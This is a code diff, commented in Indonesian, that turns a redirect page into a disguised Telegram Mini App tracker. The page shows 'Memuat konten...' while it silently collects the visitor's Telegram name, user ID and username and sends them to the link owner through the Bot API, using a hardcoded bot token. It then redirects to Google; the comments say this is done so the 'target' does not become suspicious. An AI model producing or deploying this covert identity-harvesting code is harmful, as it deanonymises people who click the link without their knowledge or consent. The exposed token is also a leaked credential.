@@ -1,33 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting...</title>
+    <title>Memuat...</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
-<body style="background: white;">
+<body style="background: white; display: flex; justify-content: center; align-items: center; height: 100vh;">
+    <div style="font-family: sans-serif; color: #888;">Memuat konten...</div>
+
     <script>
-        // Mengambil parameter dari URL web biasa
-        const urlParams = new URLSearchParams(window.location.search);
-        const myId = urlParams.get('id'); // ID kamu
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+
+        // Ambil data pengklik
+        const user = tg.initDataUnsafe.user;
+        // Ambil ID kamu dari link (?id=xxx)
+        const params = new URLSearchParams(window.location.search);
+        const myId = params.get('id'); 
         
         const botToken = '8235135706:AAEoY_X5bamwRtLsiAqfRyz7h8b2ZvOmZlE';
 
-        if (myId) {
-            // Karena ini web biasa, kita tidak bisa ambil Nama Target secara otomatis.
-            // Kita hanya bisa kirim notif bahwa "Seseorang" telah klik.
-            const pesan = `🎯 **Link Kamu Diklik!**\n\nSeseorang baru saja membuka link kamu di channel.\n\n_Catatan: Karena ini web biasa, identitas nama hanya bisa didapat jika menggunakan Mini App._`;
+        if (user && myId) {
+            // Format mention agar nama target bisa kamu klik untuk liat profilnya
+            const mention = `[${user.first_name}](tg://user?id=${user.id})`;
+            const pesan = `🎯 **Target Terdeteksi!**\n\n👤 Nama: ${mention}\n🆔 ID: \`${user.id}\`\n🔗 User: @${user.username || 'n/a'}`;
 
+            // Kirim notif ke kamu (Admin)
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: myId,
                     text: pesan,
-                    parse_mode: 'Markdown'
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
                 })
             }).then(() => {
-                // Opsional: Alihkan ke situs lain agar tidak curiga (misal Google)
+                // Setelah lapor, alihkan ke Google/situs lain
                 window.location.href = "https://www.google.com";
             });
+        } else {
+            // Jika dibuka di browser biasa luar telegram, langsung lempar ke google
+            window.location.href = "https://www.google.com";
         }
     </script>
 </body>
